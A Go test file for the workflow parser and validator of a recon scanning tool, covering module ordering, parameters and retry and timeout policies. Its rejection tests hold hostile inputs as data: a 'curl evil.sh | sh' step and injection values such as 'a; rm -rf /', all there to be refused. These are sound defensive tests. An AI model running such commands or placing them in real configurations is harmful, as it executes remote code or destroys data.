package workflows

import (
	"context"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/MikeRoss27/scanforge/internal/modules"
	"github.com/MikeRoss27/scanforge/internal/runner"
)

type fakeModule struct {
	name     string
	requires []string
	produces []string
	soft     []string
	run      func(ctx context.Context) (*modules.Result, error)
}

func (f *fakeModule) Name() string        { return f.name }
func (f *fakeModule) Description() string { return f.name }
func (f *fakeModule) Requires() []string  { return f.requires }
func (f *fakeModule) Produces() []string  { return f.produces }
func (f *fakeModule) SoftRequires() []string {
	return f.soft
}
func (f *fakeModule) Run(ctx context.Context, _ *modules.RunContext, _ runner.Executor) (*modules.Result, error) {
	if f.run != nil {
		return f.run(ctx)
	}
	return &modules.Result{Name: f.name, Status: "completed"}, nil
}

func testRegistry() *modules.Registry {
	r := modules.NewRegistry()
	for _, m := range []*fakeModule{
		{name: "subfinder", produces: []string{"subdomains"}},
		{name: "dnsx", requires: []string{"subdomains"}, produces: []string{"resolved_hosts"}},
		{name: "httpx", requires: []string{"resolved_hosts"}, produces: []string{"alive_urls"}},
		{name: "katana", requires: []string{"alive_urls"}, soft: []string{"waf_raw"}, produces: []string{"crawled_urls"}},
		{name: "wafw00f", requires: []string{"alive_urls"}, produces: []string{"waf_raw"}},
		{name: "nuclei", requires: []string{"alive_urls"}, soft: []string{"waf_raw"}, produces: []string{"nuclei_raw"}},
		{name: "nmap", requires: []string{"open_ports"}, produces: []string{"nmap_xml"}},
		{name: "naabu", requires: []string{"resolved_hosts"}, produces: []string{"open_ports"}},
		{name: "ffuf", requires: []string{"alive_urls"}, produces: []string{"discovered_paths"}},
		{name: "wpplugins", requires: []string{"alive_urls"}, produces: []string{"wp_plugins"}},
		{name: "wpthemes", requires: []string{"alive_urls"}, produces: []string{"wp_themes"}},
		{name: "wpbrute", requires: []string{"alive_urls"}, produces: []string{"wp_brute"}},
		{name: "cyc_a", requires: []string{"b_out"}, produces: []string{"a_out"}},
		{name: "cyc_b", requires: []string{"a_out"}, produces: []string{"b_out"}},
		{name: "dup_a", produces: []string{"subdomains2", "same"}},
		{name: "dup_b", produces: []string{"same"}},
	} {
		r.Register(m)
	}
	return r
}

const goodWorkflow = `
name: web-recon
version: 1
steps:
  - id: subs
    module: subfinder
  - id: resolve
    module: dnsx
    needs: [subs]
  - id: probe
    module: httpx
    needs: [resolve]
    timeout: 10m
    retries: 2
    on_error: fail
  - id: waf
    module: wafw00f
    needs: [probe]
    on_error: continue
  - id: crawl
    module: katana
    needs: [probe, waf]
    when:
      artifact_nonempty: alive_urls
  - id: scan
    module: nuclei
    needs: [probe]
    params:
      severity: high,critical
      rate_limit: 50
      scan_timeout: 45m
`

func TestParseAndValidateGood(t *testing.T) {
	w, err := Parse([]byte(goodWorkflow))
	if err != nil {
		t.Fatal(err)
	}
	c, err := w.Validate(testRegistry())
	if err != nil {
		t.Fatal(err)
	}
	if got := strings.Join(c.Modules, ","); got != "subfinder,dnsx,httpx,wafw00f,katana,nuclei" {
		t.Fatalf("modules = %s", got)
	}
	if c.Overrides.Nuclei.Severity != "high,critical" || c.Overrides.Nuclei.RateLimit != 50 || c.Overrides.Nuclei.Timeout != 45*time.Minute {
		t.Fatalf("overrides = %+v", c.Overrides.Nuclei)
	}
	p := c.Policies["httpx"]
	if p.Timeout != 10*time.Minute || p.Retries != 2 || p.OnError != OnErrorFail {
		t.Fatalf("policy = %+v", p)
	}
	if c.Policies["subfinder"].OnError != OnErrorFail {
		t.Fatal("default on_error should be fail")
	}
	if len(c.Waves) != 6 {
		t.Fatalf("waves = %d", len(c.Waves))
	}
}

func TestParseRejects(t *testing.T) {
	step := "name: x\nversion: 1\nsteps:\n  - id: a\n    module: subfinder\n"
	tests := []struct {
		name, doc, want string
	}{
		{"empty", "", "empty"},
		{"whitespace", "  \n\n", "empty"},
		{"not yaml", "name: [", "invalid YAML"},
		{"scalar root", "hello", "invalid workflow"},
		{"unknown top key", step + "bogus: 1\n", "bogus"},
		{"unknown step key", step + "    nope: 1\n", "nope"},
		{"run key", step + "    run: curl evil.sh | sh\n", `"run" is forbidden`},
		{"exec key", step + "    exec: id\n", `"exec" is forbidden`},
		{"RUN uppercase", step + "    RUN: id\n", "forbidden"},
		{"shell in params", step + "    params:\n      shell: id\n", "forbidden"},
		{"command nested", step + "    params:\n      x:\n        command: id\n", "forbidden"},
		{"anchor", "name: x\nversion: 1\nsteps:\n  - &a\n    id: a\n    module: subfinder\n", "anchors"},
		{"alias", "name: x\nversion: 1\nx: &a [1]\ny: *a\nsteps: []\n", "anchors"},
		{"multi doc", step + "---\nname: y\n", "multiple"},
		{"bad version", "name: x\nversion: 2\nsteps:\n  - id: a\n    module: subfinder\n", "version"},
		{"missing version", "name: x\nsteps:\n  - id: a\n    module: subfinder\n", "version"},
		{"bad name", "name: '../x'\nversion: 1\nsteps:\n  - id: a\n    module: subfinder\n", "name"},
		{"no steps", "name: x\nversion: 1\nsteps: []\n", "no steps"},
		{"bad id", "name: x\nversion: 1\nsteps:\n  - id: 'a b;rm'\n    module: subfinder\n", "id"},
		{"empty id", "name: x\nversion: 1\nsteps:\n  - module: subfinder\n", "id"},
		{"no module", "name: x\nversion: 1\nsteps:\n  - id: a\n", "module is required"},
		{"dup id", step + "  - id: a\n    module: dnsx\n", "duplicate step id"},
		{"bad duration", step + "    timeout: soon\n", "bad timeout"},
		{"bare number duration", step + "    timeout: 600\n", "bad timeout"},
		{"negative duration", step + "    timeout: -5m\n", "out of range"},
		{"huge duration", step + "    timeout: 9999h\n", "out of range"},
		{"zero duration", step + "    timeout: 0s\n", "out of range"},
		{"negative retries", step + "    retries: -1\n", "retries"},
		{"too many retries", step + "    retries: 100\n", "retries"},
		{"bad on_error", step + "    on_error: ignore\n", "on_error"},
		{"when empty", step + "    when: {}\n", "exactly one"},
		{"when both", step + "    when:\n      artifact_present: a\n      artifact_nonempty: b\n", "exactly one"},
		{"when expr", step + "    when: \"1 == 1\"\n", "invalid workflow"},
		{"when code key", step + "    when:\n      expr: len(x) > 0\n", "expr"},
		{"when bad artifact", step + "    when:\n      artifact_present: \"a; rm -rf /\"\n", "invalid artifact"},
		{"too large", strings.Repeat("#", MaxFileSize+1), "too large"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, err := Parse([]byte(tt.doc))
			if err == nil {
				t.Fatalf("expected error containing %q", tt.want)
			}
			if !strings.Contains(err.Error(), tt.want) {
				t.Fatalf("error %q does not contain %q", err, tt.want)
			}
		})
	}
}

func TestParseTooManySteps(t *testing.T) {
	var b strings.Builder
	b.WriteString("name: x\nversion: 1\nsteps:\n")
	for i := 0; i <= MaxSteps; i++ {
		b.WriteString("  - id: s" + string(rune('a'+i%26)) + strings.Repeat("x", i) + "\n    module: subfinder\n")
	}
	if _, err := Parse([]byte(b.String())); err == nil || !strings.Contains(err.Error(), "too many") {
		t.Fatalf("err = %v", err)
	}
}

func TestValidateRejects(t *testing.T) {
	hdr := "name: x\nversion: 1\nsteps:\n"
	subs := "  - id: subs\n    module: subfinder\n"
	res := "  - id: res\n    module: dnsx\n    needs: [subs]\n"
	tests := []struct {
		name, doc, want string
	}{
		{"unknown module", hdr + "  - id: a\n    module: rm\n", "unknown module"},
		{"shell-ish module", hdr + "  - id: a\n    module: '/bin/sh'\n", "unknown module"},
		{"denied module", hdr + "  - id: a\n    module: wpbrute\n", "not allowed"},
		{"duplicate module", hdr + subs + "  - id: again\n    module: subfinder\n", "already used"},
		{"unknown need", hdr + subs + "  - id: res\n    module: dnsx\n    needs: [ghost]\n", "unknown step"},
		{"self need", hdr + "  - id: subs\n    module: subfinder\n    needs: [subs]\n", "needs itself"},
		{"duplicate need", hdr + subs + "  - id: res\n    module: dnsx\n    needs: [subs, subs]\n", "duplicate need"},
		{"needs cycle", hdr + "  - id: a\n    module: subfinder\n    needs: [b]\n  - id: b\n    module: dnsx\n    needs: [a]\n", "cycle"},
		{"artifact cycle", hdr + "  - id: a\n    module: cyc_a\n    needs: [b]\n  - id: b\n    module: cyc_b\n    needs: [a]\n", "cycle"},
		{"missing producer", hdr + res[:len(res)-len("    needs: [subs]\n")], "no step produces"},
		{"need omitted", hdr + subs + "  - id: res\n    module: dnsx\n", "missing from needs"},
		{"need wrong producer", hdr + subs + "  - id: other\n    module: wafw00f\n" + "  - id: res\n    module: dnsx\n    needs: [other]\n", "no step produces"},
		{"unrelated need", hdr + subs + "  - id: alone\n    module: subfinder2\n", "unknown module"},
		{"need without artifact link", hdr + subs + res + "  - id: p\n    module: httpx\n    needs: [res]\n  - id: w\n    module: wafw00f\n    needs: [p]\n  - id: n\n    module: ffuf\n    needs: [p, w]\n", "ordering is artifact-driven"},
		{"duplicate producer", hdr + "  - id: a\n    module: dup_a\n  - id: b\n    module: dup_b\n", "already produced"},
		{"when unknown artifact", hdr + subs + res + "  - id: p\n    module: httpx\n    needs: [res]\n    when:\n      artifact_present: ghost\n", "no step produces"},
		{"when not in needs", hdr + subs + res + "  - id: p\n    module: httpx\n    needs: [res]\n    when:\n      artifact_present: waf_raw\n  - id: w\n    module: wafw00f\n    needs: [p]\n", "missing from needs"},
		{"when self", hdr + subs + "    when:\n      artifact_present: subdomains\n", "itself"},
		{"params on paramless module", hdr + "  - id: a\n    module: subfinder\n    params:\n      x: 1\n", "accepts no params"},
		{"unknown param", hdr + subs + res + "  - id: p\n    module: httpx\n    needs: [res]\n  - id: n\n    module: nuclei\n    needs: [p]\n    params:\n      bogus: 1\n", "unknown param"},
		{"param wrong type", hdr + subs + res + "  - id: p\n    module: httpx\n    needs: [res]\n  - id: n\n    module: nuclei\n    needs: [p]\n    params:\n      rate_limit: fast\n", "expected an integer"},
		{"param out of range", hdr + subs + res + "  - id: p\n    module: httpx\n    needs: [res]\n  - id: n\n    module: nuclei\n    needs: [p]\n    params:\n      rate_limit: 99999999\n", "out of range"},
		{"param newline", hdr + subs + res + "  - id: p\n    module: httpx\n    needs: [res]\n  - id: n\n    module: nuclei\n    needs: [p]\n    params:\n      tags: \"a\\nb\"\n", "control characters"},
		{"param bad enum", hdr + subs + res + "  - id: p\n    module: httpx\n    needs: [res]\n  - id: n\n    module: wpplugins\n    needs: [p]\n    params:\n      detection_mode: yolo\n", "must be one of"},
		{"param list", hdr + subs + res + "  - id: p\n    module: httpx\n    needs: [res]\n  - id: n\n    module: nuclei\n    needs: [p]\n    params:\n      tags: [a, b]\n", "expected a string"},
		{"wp conflict", hdr + subs + res + "  - id: p\n    module: httpx\n    needs: [res]\n  - id: a\n    module: wpplugins\n    needs: [p]\n    params:\n      detection_mode: passive\n  - id: b\n    module: wpthemes\n    needs: [p]\n    params:\n      detection_mode: aggressive\n", "conflicts"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			w, err := Parse([]byte(tt.doc))
			if err != nil {
				if strings.Contains(err.Error(), tt.want) {
					return
				}
				t.Fatalf("parse error %q does not contain %q", err, tt.want)
			}
			_, err = w.Validate(testRegistry())
			if err == nil {
				t.Fatalf("expected error containing %q", tt.want)
			}
			if !strings.Contains(err.Error(), tt.want) {
				t.Fatalf("error %q does not contain %q", err, tt.want)
			}
		})
	}
}

func TestValidateSoftOrderingNeedAllowed(t *testing.T) {
	// nuclei soft-requires waf_raw: needing wafw00f is a legitimate ordering.
	doc := `
name: x
version: 1
steps:
  - {id: s, module: subfinder}
  - {id: d, module: dnsx, needs: [s]}
  - {id: h, module: httpx, needs: [d]}
  - {id: w, module: wafw00f, needs: [h]}
  - {id: n, module: nuclei, needs: [h, w]}
`
	w, err := Parse([]byte(doc))
	if err != nil {
		t.Fatal(err)
	}
	c, err := w.Validate(testRegistry())
	if err != nil {
		t.Fatal(err)
	}
	waves := map[string]int{}
	for _, s := range c.Waves {
		waves[s.Name] = s.Wave
	}
	if waves["nuclei"] <= waves["wafw00f"] {
		t.Fatalf("nuclei must run after wafw00f: %v", waves)
	}
}

func TestLoad(t *testing.T) {
	dir := t.TempDir()
	p := filepath.Join(dir, "w.yaml")
	if err := os.WriteFile(p, []byte(goodWorkflow), 0o600); err != nil {
		t.Fatal(err)
	}
	if _, err := Load(p); err != nil {
		t.Fatal(err)
	}
	if _, err := Load(filepath.Join(dir, "missing.yaml")); err == nil {
		t.Fatal("expected error")
	}
}

// ---- policy wrapper ----

func policyFor(t *testing.T, inner *fakeModule, p Policy) *policyModule {
	t.Helper()
	p.StepID = "step"
	return &policyModule{inner: inner, policy: p, backoff: func(int) time.Duration { return time.Millisecond }}
}

func TestPolicyRetries(t *testing.T) {
	calls := 0
	m := &fakeModule{name: "m", run: func(context.Context) (*modules.Result, error) {
		calls++
		if calls < 3 {
			return nil, errors.New("boom")
		}
		return &modules.Result{Name: "m", Status: "completed"}, nil
	}}
	res, err := policyFor(t, m, Policy{Retries: 2, OnError: OnErrorFail}).Run(context.Background(), modules.NewRunContext("t", "p", true, nil), nil)
	if err != nil || res.Status != "completed" || calls != 3 {
		t.Fatalf("res=%v err=%v calls=%d", res, err, calls)
	}
}

func TestPolicyOnError(t *testing.T) {
	fail := func(context.Context) (*modules.Result, error) { return nil, errors.New("boom") }
	tests := []struct {
		onError    string
		wantErr    bool
		wantStatus string
	}{
		{OnErrorFail, true, ""},
		{OnErrorContinue, false, "failed"},
		{OnErrorSkip, false, "skipped"},
	}
	for _, tt := range tests {
		t.Run(tt.onError, func(t *testing.T) {
			calls := 0
			m := &fakeModule{name: "m", run: func(ctx context.Context) (*modules.Result, error) { calls++; return fail(ctx) }}
			res, err := policyFor(t, m, Policy{Retries: 1, OnError: tt.onError}).Run(context.Background(), modules.NewRunContext("t", "p", true, nil), nil)
			if (err != nil) != tt.wantErr {
				t.Fatalf("err = %v", err)
			}
			if !tt.wantErr && res.Status != tt.wantStatus {
				t.Fatalf("status = %s", res.Status)
			}
			if calls != 2 {
				t.Fatalf("calls = %d", calls)
			}
		})
	}
}

func TestPolicyTimeout(t *testing.T) {
	m := &fakeModule{name: "m", run: func(ctx context.Context) (*modules.Result, error) {
		<-ctx.Done()
		return nil, ctx.Err()
	}}
	_, err := policyFor(t, m, Policy{Timeout: 20 * time.Millisecond, OnError: OnErrorFail}).Run(context.Background(), modules.NewRunContext("t", "p", true, nil), nil)
	if err == nil || !strings.Contains(err.Error(), "timed out") {
		t.Fatalf("err = %v", err)
	}
}

func TestPolicyAbortNotSoftened(t *testing.T) {
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	m := &fakeModule{name: "m", run: func(ctx context.Context) (*modules.Result, error) { return nil, ctx.Err() }}
	_, err := policyFor(t, m, Policy{OnError: OnErrorContinue, Retries: 3}).Run(ctx, modules.NewRunContext("t", "p", true, nil), nil)
	if !errors.Is(err, context.Canceled) {
		t.Fatalf("err = %v", err)
	}
}

func TestPolicyWhen(t *testing.T) {
	dir := t.TempDir()
	empty := filepath.Join(dir, "empty.txt")
	full := filepath.Join(dir, "full.txt")
	blank := filepath.Join(dir, "blank.txt")
	for p, c := range map[string]string{empty: "", full: "https://a\n", blank: " \n\n"} {
		if err := os.WriteFile(p, []byte(c), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	tests := []struct {
		name     string
		when     When
		artifact string
		path     string
		wantRun  bool
	}{
		{"present ok", When{ArtifactPresent: "a"}, "a", empty, true},
		{"present missing", When{ArtifactPresent: "a"}, "", "", false},
		{"nonempty ok", When{ArtifactNonEmpty: "a"}, "a", full, true},
		{"nonempty empty file", When{ArtifactNonEmpty: "a"}, "a", empty, false},
		{"nonempty blank file", When{ArtifactNonEmpty: "a"}, "a", blank, false},
		{"nonempty missing file", When{ArtifactNonEmpty: "a"}, "a", filepath.Join(dir, "nope"), false},
		{"nonempty missing artifact", When{ArtifactNonEmpty: "a"}, "", "", false},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ran := false
			m := &fakeModule{name: "m", run: func(context.Context) (*modules.Result, error) {
				ran = true
				return &modules.Result{Name: "m", Status: "completed"}, nil
			}}
			rc := modules.NewRunContext("t", "p", false, nil)
			if tt.artifact != "" {
				rc.Artifacts[tt.artifact] = modules.Artifact{Name: tt.artifact, Type: "text", Path: tt.path}
			}
			when := tt.when
			res, err := policyFor(t, m, Policy{OnError: OnErrorFail, When: &when}).Run(context.Background(), rc, nil)
			if err != nil || ran != tt.wantRun {
				t.Fatalf("ran=%v err=%v", ran, err)
			}
			if !tt.wantRun && (res.Status != "skipped" || res.Reason == "") {
				t.Fatalf("res = %+v", res)
			}
		})
	}
}

func TestRegistryWrapsPreservingContract(t *testing.T) {
	w, err := Parse([]byte(goodWorkflow))
	if err != nil {
		t.Fatal(err)
	}
	c, err := w.Validate(testRegistry())
	if err != nil {
		t.Fatal(err)
	}
	reg, err := c.Registry(testRegistry())
	if err != nil {
		t.Fatal(err)
	}
	mods, err := reg.Resolve(c.Modules)
	if err != nil {
		t.Fatal(err)
	}
	k, _ := reg.Get("katana")
	if _, ok := k.(modules.SoftRequires); !ok || len(mods) != len(c.Modules) {
		t.Fatal("wrapper must preserve SoftRequires and module set")
	}
	if got := k.Requires(); len(got) != 1 || got[0] != "alive_urls" {
		t.Fatalf("requires = %v", got)
	}
	if _, err := reg.Resolve([]string{"nmap"}); err == nil {
		t.Fatal("registry must only expose workflow modules")
	}
}
